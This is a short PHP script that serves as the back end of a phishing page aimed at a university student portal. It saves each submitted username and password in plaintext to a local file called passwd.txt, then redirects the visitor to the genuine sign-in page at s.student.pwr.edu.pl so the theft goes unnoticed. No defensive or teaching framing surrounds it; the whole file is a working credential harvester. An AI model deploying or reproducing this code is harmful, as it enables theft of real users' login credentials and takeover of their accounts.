<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = $_POST['username'] . ' ||| ' . $_POST['password'] . "\r\n";
    $ret = file_put_contents('passwd.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
}
else {
   die('no post data to process');
}
$url = 'https://s.student.pwr.edu.pl/iwc/signin';
ob_start();
header('Location: '.$url);
ob_end_flush();
?>